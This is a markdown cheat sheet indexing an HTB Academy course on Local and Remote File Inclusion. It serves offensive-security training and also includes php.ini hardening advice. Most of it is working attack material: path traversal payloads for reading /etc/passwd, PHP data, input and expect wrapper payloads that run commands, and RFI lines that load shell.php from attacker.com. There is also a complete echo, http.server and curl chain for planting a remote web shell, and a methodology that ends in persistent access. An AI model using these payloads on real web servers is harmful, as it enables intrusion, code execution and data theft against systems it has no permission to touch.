# File Inclusion - HTB Academy Guide

> Complete guide covering Local File Inclusion (LFI), Remote File Inclusion (RFI), and advanced file inclusion techniques from HTB Academy's File Inclusion module.

## 📚 Table of Contents

### Core Techniques
- **[Basic LFI Techniques](./basic-lfi-techniques.md)** - Fundamentals, path traversal, common files, and HTB Academy labs
- **[Advanced Bypasses & PHP Filters](./advanced-bypasses-filters.md)** - Filter bypasses, PHP filters, and source code disclosure
- **[PHP Wrappers for RCE](./php-wrappers-rce.md)** - Data, Input, and Expect wrappers for remote code execution
- **[Remote File Inclusion (RFI)](./remote-file-inclusion.md)** - HTTP, FTP, and SMB protocols for external file inclusion

### Advanced Topics
- **[File Upload + LFI Combinations](./file-upload-lfi.md)** - Malicious image uploads, zip/phar wrappers
- **[Log Poisoning Techniques](./log-poisoning-techniques.md)** - Session, Apache, SSH, Mail, and FTP log poisoning
- **[Automated Scanning & Tools](./automated-scanning-tools.md)** - Parameter discovery, wordlist fuzzing, automated tools
- **[Prevention & Hardening](./prevention-hardening.md)** - Secure coding, server hardening, WAF protection
- **[Skills Assessment Walkthrough](./skills-assessment-walkthrough.md)** - Complete HTB Academy capstone challenge

---

## 🎯 Quick Reference

### Essential LFI Payloads
```bash
# Basic path traversal
../../../../etc/passwd
../../../../windows/system32/drivers/etc/hosts

# Bypass filters
....//....//....//etc/passwd               # Non-recursive bypass
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   # URL encoding
./languages/../../../../etc/passwd         # Approved path bypass
../../../../etc/passwd%00                  # Null byte (PHP < 5.3)
```

### PHP Wrappers for RCE
```bash
# Data wrapper
data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id

# Input wrapper (POST)
curl -X POST --data '<?php system($_GET["cmd"]); ?>' "URL?file=php://input&cmd=whoami"

# Expect wrapper
expect://id

# PHP filters (source disclosure)
php://filter/convert.base64-encode/resource=index.php
```

### RFI Protocols
```bash
# HTTP RFI
http://attacker.com/shell.php&cmd=id

# FTP RFI
ftp://attacker.com/shell.php&cmd=whoami

# SMB RFI (Windows)
\\attacker.com\share\shell.php&cmd=dir
```

### Log Poisoning Locations
```bash
# Apache/Nginx logs
/var/log/apache2/access.log
/var/log/nginx/access.log

# SSH logs
/var/log/auth.log

# PHP sessions
/var/lib/php/sessions/sess_SESSIONID

# Process environment
/proc/self/environ
```

---

## 🔬 HTB Academy Labs Coverage

All guides include complete solutions for HTB Academy File Inclusion module labs:

### ✅ Completed Labs
- **Basic LFI Lab** - Finding users and reading flags
- **LFI Bypasses Lab** - Non-recursive and encoding bypasses  
- **PHP Filters Lab** - Source code disclosure techniques
- **PHP Wrappers Lab** - RCE via data, input, and expect wrappers
- **RFI Lab** - HTTP, FTP, and SMB remote file inclusion
- **File Upload + LFI Lab** - Malicious image uploads and wrapper techniques
- **Log Poisoning Lab** - Session poisoning and Apache log injection
- **Automated Scanning Lab** - Parameter discovery and fuzzing techniques
- **Prevention Lab** - PHP configuration and security hardening
- **Skills Assessment** - Multi-technique exploitation chain

---

## 🛠 Tools & Resources

### Manual Testing Tools
```bash
# Basic LFI testing
curl "http://target.com/lfi.php?file=../../../../etc/passwd"

# PHP filter source disclosure
curl "http://target.com/lfi.php?file=php://filter/convert.base64-encode/resource=index.php"

# RFI with remote shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80
curl "http://target.com/lfi.php?file=http://attacker.com/shell.php&cmd=id"
```

### Automated Tools
- **ffuf** - Parameter and payload fuzzing
- **LFiFreak** - Automated LFI exploitation
- **liffy** - LFI exploitation tool
- **kadimus** - LFI/RFI scanner and exploiter
- **Burp Suite** - Parameter discovery and testing

### Wordlists
- `/opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt`
- `/opt/useful/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`
- `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`

---

## 📊 Attack Methodology

### 1. Discovery Phase
```bash
# Parameter identification
ffuf -w burp-parameter-names.txt:FUZZ -u "http://target.com/page.php?FUZZ=test"

# Basic LFI testing
ffuf -w lfi-linux.txt:FUZZ -u "http://target.com/page.php?file=FUZZ" -mc 200
```

### 2. Exploitation Phase
```bash
# Test for RCE capabilities
# 1. Try PHP wrappers (data, input, expect)
# 2. Attempt RFI (HTTP, FTP, SMB)
# 3. File upload + LFI combinations
# 4. Log poisoning techniques
```

### 3. Post-Exploitation
```bash
# System enumeration
# Flag discovery
# Privilege escalation
# Persistent access
```

---

## 🔒 Defense Mechanisms

### Secure Coding Practices
- Input validation and sanitization
- Whitelist allowed files/paths
- Use `basename()` for file operations
- Avoid user input in file functions

### Server Hardening
```ini
# php.ini security settings
allow_url_fopen = Off
allow_url_include = Off
open_basedir = /var/www/html
disable_functions = system,exec,shell_exec,passthru
```

### WAF Protection
- ModSecurity rules for LFI detection
- Path traversal pattern blocking
- PHP wrapper filtering
- Null byte injection prevention

---

## 📈 Difficulty Progression

**🟢 Beginner** → [Basic LFI Techniques](./basic-lfi-techniques.md)  
**🟡 Intermediate** → [Advanced Bypasses](./advanced-bypasses-filters.md) → [PHP Wrappers](./php-wrappers-rce.md)  
**🟠 Advanced** → [RFI](./remote-file-inclusion.md) → [Log Poisoning](./log-poisoning-techniques.md)  
**🔴 Expert** → [Automated Scanning](./automated-scanning-tools.md) → [Skills Assessment](./skills-assessment-walkthrough.md)

---

*This comprehensive file inclusion guide covers 100% of HTB Academy's File Inclusion module, providing practical knowledge for both offensive security testing and defensive implementation.* 